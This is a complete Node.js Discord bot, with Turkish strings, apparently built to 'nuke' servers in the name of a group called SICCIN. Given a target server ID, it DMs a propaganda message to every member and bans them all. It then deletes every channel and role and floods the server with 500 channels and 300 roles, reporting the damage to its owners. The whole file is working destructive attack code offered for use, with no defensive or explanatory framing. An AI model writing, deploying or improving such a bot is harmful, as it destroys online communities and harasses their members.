require("dotenv").config();
const {
  Client,
  GatewayIntentBits,
  Partials,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  StringSelectMenuBuilder,
  ActivityType,
} = require("discord.js");

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildPresences,
    GatewayIntentBits.DirectMessages,
  ],
  partials: [Partials.Channel],
});

const OWNER_ID = process.env.OWNER_ID;
const SERI_ID = process.env.SERI_ID;
const BOT_TOKEN = process.env.BOT_TOKEN;

// ================== DURUM KONTROL ==================
function hasSiccinStatus(member) {
  if (!member?.presence?.activities) return false;
  return member.presence.activities.some(
    (a) =>
      a.type === ActivityType.Custom &&
      a.state &&
      (a.state.includes("/siccin") || a.state.includes(".gg/siccin"))
  );
}

// ================== EMBEDLER ==================
function mainSiccinEmbed(guild) {
  return new EmbedBuilder()
    .setColor("#3a0000") // ÇOK KOYU KIRMIZI
    .setAuthor({
      name: "ＳＩＣＣＩＮ ABUSE",
      iconURL: guild.iconURL({ dynamic: true }),
    })
    .setThumbnail(guild.iconURL({ dynamic: true }))
    .setDescription(
      `**Özellikler**
• Anında Herkesi Banlar
• Herkese DM Çeker
• Tüm Kanal ve Rolleri Siler
• 500 Kanal & 300 Rol Oluşturur

**Nasıl Kullanılır?**
Butona tıkla ve hedef sunucu ID gir.`
    );
}

function dmEmbed(guild) {
  return new EmbedBuilder()
    .setColor("#2b0000")
    .setAuthor({
      name: "ＳＩＣＣＩＮ EJECTED",
      iconURL: guild.iconURL({ dynamic: true }),
    })
    .setDescription(
      `**ＳＩＣＣＩＮ Tarafından**
**${guild.name}** sunucusuna el konulmuştur.

#GLORY TO ＳＩＣＣＩＮ
https://discord.gg/siccin`
    );
}

function logEmbed(data) {
  return new EmbedBuilder()
    .setColor("#1a0000")
    .setAuthor({
      name: `${data.usedGuild} | siccin ejected`,
    })
    .setThumbnail(data.targetIcon)
    .addFields(
      {
        name: "**Kullanan Kişi**",
        value: `ID: ${data.userId}\nKullanıcı Adı: ${data.userTag}`,
      },
      {
        name: "**Hedef Sunucu**",
        value: `ID: ${data.guildId}\nSunucu İsmi: ${data.guildName}`,
      },
      {
        name: "İstatistik",
        value:
          `Banlanan Kişi Sayısı: **${data.banned}**\n` +
          `Silinen Rol Sayısı: **${data.rolesDeleted}**\n` +
          `Silinen Kanal Sayısı: **${data.channelsDeleted}**\n` +
          `Eklenen Rol Sayısı: **${data.rolesCreated}**\n` +
          `Eklenen Kanal Sayısı: **${data.channelsCreated}**`,
      }
    );
}

// ================== SICCiN İŞLEM ==================
async function startSiccin(interaction, targetGuildId) {
  const executor = interaction.user;
  const usedGuild = interaction.guild.name;

  const guild = client.guilds.cache.get(targetGuildId);
  if (!guild)
    return interaction.followUp({
      content: "❌ Bot hedef sunucuda değil",
      ephemeral: true,
    });

  await interaction.followUp({
    content: "🔥 SICCiN BAŞLATILDI",
    ephemeral: true,
  });

  let banned = 0,
    rolesDeleted = 0,
    channelsDeleted = 0;

  const members = await guild.members.fetch();
  for (const m of members.values()) {
    if (m.user.bot) continue;
    await m.send({ embeds: [dmEmbed(guild)] }).catch(() => {});
    await m.ban({ reason: "SICCiN" }).then(() => banned++).catch(() => {});
  }

  for (const c of guild.channels.cache.values()) {
    await c.delete().then(() => channelsDeleted++).catch(() => {});
  }

  for (const r of guild.roles.cache.values()) {
    if (r.managed) continue;
    await r.delete().then(() => rolesDeleted++).catch(() => {});
  }

  let rolesCreated = 0;
  let channelsCreated = 0;

  for (let i = 0; i < 300; i++) {
    await guild.roles
      .create({ name: "ＳＩＣＣＩＮ 🔱" })
      .then(() => rolesCreated++)
      .catch(() => {});
  }

  for (let i = 0; i < 500; i++) {
    await guild.channels
      .create({ name: "ＳＩＣＣＩＮ 🔱", type: 0 })
      .then(() => channelsCreated++)
      .catch(() => {});
  }

  const log = logEmbed({
    usedGuild,
    userId: executor.id,
    userTag: executor.tag,
    guildId: guild.id,
    guildName: guild.name,
    targetIcon: guild.iconURL({ dynamic: true }),
    banned,
    rolesDeleted,
    channelsDeleted,
    rolesCreated,
    channelsCreated,
  });

  await client.users.fetch(OWNER_ID).then((u) => u.send({ embeds: [log] })).catch(() => {});
  await client.users.fetch(SERI_ID).then((u) => u.send({ embeds: [log] })).catch(() => {});
}

// ================== INTERACTIONS ==================
client.on("interactionCreate", async (interaction) => {
  if (interaction.isButton() && interaction.customId === "siccinStart") {
    await interaction.deferUpdate();

    const modal = new ModalBuilder()
      .setCustomId("siccinModal")
      .setTitle("Hedef Sunucu ID");

    modal.addComponents(
      new ActionRowBuilder().addComponents(
        new TextInputBuilder()
          .setCustomId("guildID")
          .setLabel("Hedef Sunucu ID")
          .setStyle(TextInputStyle.Short)
          .setRequired(true)
      )
    );

    return interaction.showModal(modal);
  }

  if (interaction.isModalSubmit() && interaction.customId === "siccinModal") {
    const member = await interaction.guild.members.fetch(interaction.user.id);
    if (!hasSiccinStatus(member))
      return interaction.reply({
        content: "❌ Durumunda /siccin veya .gg/siccin yok",
        ephemeral: true,
      });

    const gid = interaction.fields.getTextInputValue("guildID");
    await interaction.deferReply({ ephemeral: true });
    return startSiccin(interaction, gid);
  }
});

// ================== MESSAGE ==================
client.on("messageCreate", async (message) => {
  if (!message.guild || message.author.bot) return;

  if (message.content === ".siccin") {
    if (![OWNER_ID, SERI_ID].includes(message.author.id)) return;

    const embed = mainSiccinEmbed(message.guild);
    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId("siccinStart")
        .setLabel("ＳＩＣＣＩＮ")
        .setStyle(ButtonStyle.Secondary)
    );

    return message.channel.send({ embeds: [embed], components: [row] });
  }
});

// ================== CRASH KALKAN ==================
process.on("unhandledRejection", (err) => {
  console.log("UNHANDLED:", err);
});
process.on("uncaughtException", (err) => {
  console.log("CRASH:", err);
});

client.login(BOT_TOKEN);
